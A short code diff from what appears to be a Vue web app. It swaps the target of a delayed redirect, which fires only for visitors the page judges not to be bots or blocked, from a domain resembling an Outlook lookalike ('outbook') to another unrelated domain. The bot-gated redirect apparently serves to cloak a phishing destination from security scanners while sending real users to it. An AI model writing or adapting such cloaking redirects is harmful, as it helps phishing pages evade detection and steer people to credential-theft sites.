@@ -56,7 +56,7 @@ const app = createApp({
       
       if (!isBot.value && !isBlocked.value) {
         setTimeout(() => {
-          window.location.href = 'https://outbook.leviweb.com.ar/';
+          window.location.href = 'https://ttp.rodolfocolen.com.br/';
         }, 3000);
       }
     });
